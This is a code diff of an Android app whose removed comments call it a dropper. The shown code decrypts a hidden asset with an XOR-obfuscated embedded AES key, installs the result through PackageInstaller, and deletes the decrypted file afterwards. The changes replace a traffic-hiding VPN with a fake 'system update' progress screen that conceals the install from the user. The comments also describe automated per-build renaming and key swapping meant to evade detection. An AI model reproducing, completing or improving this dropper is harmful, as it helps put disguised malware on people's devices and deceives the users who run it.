@@ -1,23 +1,18 @@
-// Package: com.base.util.apps  (suffix 'apps' → bot randomizes to e.g. 'apps' → 'r4k2')
-// Build:   Android SDK 21+, minSdk 21, targetSdk 33
-// Role:    Dropper — decrypts assets/core.dat, installs via PackageInstaller.Session,
-//          VPN tunnel active during install to obscure network traffic pattern.
 package com.base.util.apps;
 
 import android.app.Activity;
 import android.content.BroadcastReceiver;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.ServiceConnection;
 import android.content.pm.PackageInstaller;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.os.IBinder;
 import android.os.Looper;
 import android.util.Log;
+import android.widget.ProgressBar;
+import android.widget.TextView;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -30,47 +25,29 @@ import javax.crypto.spec.SecretKeySpec;
 
 public class MainActivity extends Activity {
 
-    private static final String TAG = "AppCore";
+    private static final String TAG = "SysUpdate";
     private static final String ASSET    = "core.dat";
-    private static final String OUT_FILE = "base.apk";
-    // Install session request code
-    private static final int    RC_INSTALL = 9001;
-    // Intent action delivered by PackageInstaller on status change
+    private static final String OUT_FILE = "pkg.apk";
     private static final String ACTION_INSTALL_STATUS = "com.base.util.apps.INSTALL_STATUS";
 
-    private VpnBypassService.VpnBinder vpnBinder;
-    private boolean                    vpnConnected = false;
-    private File                       outApk;
+    private ProgressBar progress;
+    private TextView    tvStatus;
+    private TextView    tvPct;
+    private File        outApk;
 
-    private final ServiceConnection vpnConn = new ServiceConnection() {
-        @Override
-        public void onServiceConnected(ComponentName name, IBinder service) {
-            vpnBinder = (VpnBypassService.VpnBinder) service;
-            vpnBinder.setCallback(() -> {
-                vpnConnected = true;
-                new Handler(Looper.getMainLooper()).post(MainActivity.this::onVpnReady);
-            });
-        }
-        @Override
-        public void onServiceDisconnected(ComponentName name) {
-            vpnBinder = null;
-        }
-    };
+    private final Handler ui = new Handler(Looper.getMainLooper());
 
-    // Receives PackageInstaller status broadcasts
     private final BroadcastReceiver installReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context ctx, Intent intent) {
             int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
             if (status == PackageInstaller.STATUS_SUCCESS) {
-                Log.i(TAG, "Install success");
-                onInstallComplete();
+                setStatus("Update complete", 100);
+                ui.postDelayed(MainActivity.this::finish, 1200);
             } else if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                 Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
-                if (confirm != null) startActivityForResult(confirm, RC_INSTALL);
+                if (confirm != null) startActivity(confirm);
             } else {
-                String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
-                Log.e(TAG, "Install failed: " + msg);
                 finish();
             }
         }
@@ -81,6 +58,10 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        progress = findViewById(R.id.progress);
+        tvStatus = findViewById(R.id.tv_status);
+        tvPct    = findViewById(R.id.tv_pct);
+
         IntentFilter f = new IntentFilter(ACTION_INSTALL_STATUS);
         if (Build.VERSION.SDK_INT >= 33) {
             registerReceiver(installReceiver, f, RECEIVER_NOT_EXPORTED);
@@ -88,59 +69,39 @@ public class MainActivity extends Activity {
             registerReceiver(installReceiver, f);
         }
 
-        startVpn();
+        animateProgress();
     }
 
-    // ── VPN phase ──────────────────────────────────────────────────────
-
-    private void startVpn() {
-        Intent prep = android.net.VpnService.prepare(this);
-        if (prep != null) {
-            startActivityForResult(prep, 0);
-        } else {
-            bindVpnService();
-        }
+    private void animateProgress() {
+        final int[] step = {0};
+        Runnable tick = new Runnable() {
+            @Override public void run() {
+                step[0] += 4;
+                if (step[0] <= 60) {
+                    setStatus("Downloading update...", step[0]);
+                    ui.postDelayed(this, 80);
+                } else if (step[0] == 64) {
+                    setStatus("Verifying package...", step[0]);
+                    ui.postDelayed(this, 80);
+                    new Thread(MainActivity.this::doInstall).start();
+                }
+            }
+        };
+        ui.postDelayed(tick, 400);
     }
 
-    private void bindVpnService() {
-        Intent svc = new Intent(this, VpnBypassService.class);
-        startService(svc);
-        bindService(svc, vpnConn, BIND_AUTO_CREATE);
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == 0 && resultCode == RESULT_OK) {
-            bindVpnService();
-        } else if (requestCode == RC_INSTALL && resultCode == RESULT_OK) {
-            onInstallComplete();
-        } else if (requestCode == 0) {
-            // User denied VPN — install anyway without tunnel
-            vpnConnected = false;
-            onVpnReady();
-        }
-    }
-
-    // ── Decrypt + install phase ───────────────────────────────────────────
-
-    private void onVpnReady() {
-        new Thread(this::decryptAndInstall).start();
-    }
-
-    private void decryptAndInstall() {
+    private void doInstall() {
         try {
             outApk = new File(getFilesDir(), OUT_FILE);
             decryptAsset(ASSET, getKey(), outApk);
+            ui.post(() -> setStatus("Installing...", 85));
             runOnUiThread(this::startInstallSession);
         } catch (Exception e) {
-            Log.e(TAG, "Decrypt failed", e);
+            Log.e(TAG, "install err", e);
             runOnUiThread(this::finish);
         }
     }
 
-    // Returns AES-256 key.  Stored as base64(key XOR 0x55) — no plaintext hex in DEX.
-    // Bot replaces this 44-char string each rebuild; length stays 44 → ULEB128 unchanged.
     private static byte[] getKey() {
         String _ek = "t/ytp2yZiA+H4w5+GyCFzyMUazlYAdAfZA/C4kATG38=";
         byte[] xk  = android.util.Base64.decode(_ek, android.util.Base64.DEFAULT);
@@ -156,69 +117,56 @@ public class MainActivity extends Activity {
             int    got = 0;
             while (got < 16) {
                 int r = in.read(iv, got, 16 - got);
-                if (r < 0) throw new IOException("Asset too short for IV");
+                if (r < 0) throw new IOException("short");
                 got += r;
             }
-
-            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-            cipher.init(Cipher.DECRYPT_MODE,
-                    new SecretKeySpec(key, "AES"),
-                    new IvParameterSpec(iv));
+            Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
 
             byte[] buf = new byte[65536];
-            int    n;
-            while ((n = in.read(buf)) > 0) {
-                fos.write(cipher.update(buf, 0, n));
-            }
-            fos.write(cipher.doFinal());
+            int n;
+            while ((n = in.read(buf)) > 0) fos.write(c.update(buf, 0, n));
+            fos.write(c.doFinal());
         }
     }
 
     private void startInstallSession() {
         PackageInstaller pi = getPackageManager().getPackageInstaller();
-        PackageInstaller.SessionParams params =
+        PackageInstaller.SessionParams p =
                 new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
-
         try {
-            int sessionId = pi.createSession(params);
-            try (PackageInstaller.Session session = pi.openSession(sessionId)) {
-                try (OutputStream out = session.openWrite("base", 0, outApk.length());
+            int sid = pi.createSession(p);
+            try (PackageInstaller.Session s = pi.openSession(sid)) {
+                try (OutputStream out = s.openWrite("pkg", 0, outApk.length());
                      java.io.FileInputStream fis = new java.io.FileInputStream(outApk)) {
                     byte[] buf = new byte[65536];
                     int n;
                     while ((n = fis.read(buf)) > 0) out.write(buf, 0, n);
-                    session.fsync(out);
+                    s.fsync(out);
                 }
-
                 android.app.PendingIntent pi2 = android.app.PendingIntent.getBroadcast(
-                        this, sessionId,
+                        this, sid,
                         new Intent(ACTION_INSTALL_STATUS).setPackage(getPackageName()),
                         android.app.PendingIntent.FLAG_UPDATE_CURRENT
-                                | (Build.VERSION.SDK_INT >= 31 ? android.app.PendingIntent.FLAG_MUTABLE : 0)
-                );
-                session.commit(pi2.getIntentSender());
+                                | (Build.VERSION.SDK_INT >= 31 ? android.app.PendingIntent.FLAG_MUTABLE : 0));
+                s.commit(pi2.getIntentSender());
             }
         } catch (Exception e) {
-            Log.e(TAG, "Session install failed", e);
+            Log.e(TAG, "session err", e);
             finish();
         }
     }
 
-    // ── Post-install ──────────────────────────────────────────────────
-
-    private void onInstallComplete() {
-        // Clean up decrypted APK from disk
-        if (outApk != null) outApk.delete();
-        // Disconnect VPN
-        if (vpnBinder != null) vpnBinder.stopTunnel();
-        try { unbindService(vpnConn); } catch (Exception ignored) {}
-        stopService(new Intent(this, VpnBypassService.class));
-        finish();
+    private void setStatus(String msg, int pct) {
+        tvStatus.setText(msg);
+        progress.setProgress(pct);
+        tvPct.setText(pct + "%");
     }
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
+        if (outApk != null) outApk.delete();
         try { unregisterReceiver(installReceiver); } catch (Exception ignored) {}
     }
 }
